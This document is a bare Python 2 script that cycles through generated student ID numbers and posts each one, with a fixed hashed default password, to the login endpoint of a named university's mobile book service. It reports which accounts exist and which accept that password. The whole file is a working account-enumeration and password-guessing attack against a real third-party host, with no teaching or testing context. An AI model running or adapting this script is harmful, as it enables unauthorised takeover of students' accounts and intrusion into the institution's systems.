#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import time

import requests


def xhjc():
    url = 'http://mob.huanghuai.edu.cn/huanghuai/booksLogin'
    headers = {'cache':'60','Cache-Control':'max-age=2592000','Content-Type':'application/x-www-form-urlencoded','Content-Length':'60','Host':'mob.huanghuai.edu.cn','Connection':'Keep-Alive','Accept-Encoding':'gzip','User-Agent':'okhttp/3.9.0'}
    data = {'jszh':'YKT'+str(xh)+'','password':'202cb962ac59075b964b07152d234b70'}
    Soj_session = requests.session()
    res = Soj_session.post(url, data=data, headers=headers)
    nr=res.text 

    if '-2' in nr:
          print 'xxx'+str(xh)
          return 0
    if '-1' in nr:
          print 'vvv'+str(xh)
          return 1
    if  '0' in nr:
          print 'vvv'+str(xh)
          return 2


z=2599
x=100
xh='15'+str(z)+'0101'
while z<5000:
  z=z+1
  xh='15'+str(z)+'0101'

  if xhjc()>0:
       while x<900:
           x=x+1
           xh='15'+str(z)+'0'+str(x)
           if xhjc()>0:
               print '   '+str(xh)
       x=100    